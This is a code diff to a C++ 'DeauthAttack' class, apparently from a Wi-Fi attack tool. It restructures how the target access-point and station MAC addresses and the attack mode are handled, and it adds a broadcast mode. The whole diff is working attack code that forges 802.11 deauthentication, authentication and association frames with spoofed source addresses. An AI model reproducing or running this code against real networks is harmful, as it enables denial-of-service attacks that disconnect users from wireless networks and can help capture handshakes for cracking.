@@ -9,10 +9,10 @@ const dot11_radiotap_hdr DeauthAttack::rtap_hdr = {
 };
 
 
-DeauthAttack::DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr, const int mode)
+DeauthAttack::DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr)
 {
-    this->mode = mode;
-    this->init_pkt(ap_mac_addr, st_mac_addr);
+    this->ap_mac_addr = ap_mac_addr;
+    this->st_mac_addr = st_mac_addr;
 }
 
 
@@ -22,7 +22,7 @@ DeauthAttack::~DeauthAttack()
 }
 
 
-void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr)
+void DeauthAttack::init_pkt()
 {
     this->deauth_fhdr.base.duration = 0;
     this->deauth_fhdr.frag_seq_num = 0;
@@ -34,13 +34,21 @@ void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_ad
     switch (this->mode)
     {
     case DEAUTH_ATTACK_AP_TO_BROADCAST:
+        this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
+        for (size_t i = 0; i < 6; i++)
+        {
+            this->deauth_fhdr.rcv_addr[i] = BROADCAST_MAC_ADDR[i];
+            this->deauth_fhdr.src_addr[i] = this->ap_mac_addr[i];
+        }
+        this->wlm_deauth_hdr.reason_code = HANDSHAKE_TIMEOUT;
+        break;
     case DEAUTH_ATTACK_AP_TO_STATION:
     {
         this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
         for (size_t i = 0; i < 6; i++)
         {
-            this->deauth_fhdr.rcv_addr[i] = st_mac_addr[i];
-            this->deauth_fhdr.src_addr[i] = ap_mac_addr[i];
+            this->deauth_fhdr.rcv_addr[i] = this->st_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = this->ap_mac_addr[i];
         }
         this->wlm_deauth_hdr.reason_code = HANDSHAKE_TIMEOUT;
         break;
@@ -50,8 +58,8 @@ void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_ad
         this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
         for (size_t i = 0; i < 6; i++)
         {
-            this->deauth_fhdr.rcv_addr[i] = ap_mac_addr[i];
-            this->deauth_fhdr.src_addr[i] = st_mac_addr[i];
+            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
         }
         this->wlm_deauth_hdr.reason_code = CLASS3_NONASSOCIATED_STA;
         break;
@@ -61,8 +69,8 @@ void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_ad
         this->deauth_fhdr.base.fctl_field = AUTH_FRAME;
         for (size_t i = 0; i < 6; i++)
         {
-            this->deauth_fhdr.rcv_addr[i] = ap_mac_addr[i];
-            this->deauth_fhdr.src_addr[i] = st_mac_addr[i];
+            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
         }
         this->wlm_auth_hdr.auth_algo = 0x0000;
         this->wlm_auth_hdr.auth_seq = 0x0001;
@@ -74,8 +82,8 @@ void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_ad
         this->deauth_fhdr.base.fctl_field = ASSO_REQ_FRAME;
         for (size_t i = 0; i < 6; i++)
         {
-            this->deauth_fhdr.rcv_addr[i] = ap_mac_addr[i];
-            this->deauth_fhdr.src_addr[i] = st_mac_addr[i];
+            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
         }
         this->wlm_asso_req_hdr.cap_info = 0x1431;
         this->wlm_asso_req_hdr.listen_interval = 0x000a;
@@ -223,8 +231,10 @@ wlan_attack_pkt* DeauthAttack::assemble_deauth_attack_pkt()
     return attack_pkt;
 }
 
-wlan_attack_pkt* DeauthAttack::get_pkt()
+wlan_attack_pkt* DeauthAttack::get_pkt(const int mode)
 {
+    this->mode = mode;
+    this->init_pkt();
     wlan_attack_pkt* attack_pkt = assemble_pkt();
     return attack_pkt;
 }
